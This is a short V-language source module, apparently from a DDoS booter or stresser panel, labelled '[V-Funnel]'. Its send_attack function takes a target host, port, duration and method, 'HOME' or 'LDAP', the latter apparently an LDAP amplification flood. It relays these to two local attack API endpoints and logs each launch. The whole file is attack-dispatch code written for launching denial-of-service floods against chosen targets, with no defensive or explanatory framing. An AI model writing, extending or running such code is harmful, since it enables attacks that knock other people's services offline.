module attack
import net.http

pub fn send_attack(key string, host string, port string, time string, method string) {
	if method == "HOME" {
		http.get_text('http://localhost:8069/api?key=test&host=' + host + '&port=' + port + '&time=' + time + '&method=HOME')
		http.get_text('http://localhost:454/api?key=test&host=' + host + '&port=' + port + '&time=' + time + '&method=HOME')
		
	}
	if method == "LDAP" {
	    http.get_text('http://localhost:8069/api?key=test&host=' + host + '&port=' + port + '&time=' + time + '&method=LDAP')
	    http.get_text('http://localhost:454/api?key=test&host=' + host + '&port=' + port + '&time=' + time + '&method=LDAP')
		
	}
	println("[V-Funnel] User: $key | host: $host | port: $port | time: $time | method: $method")
}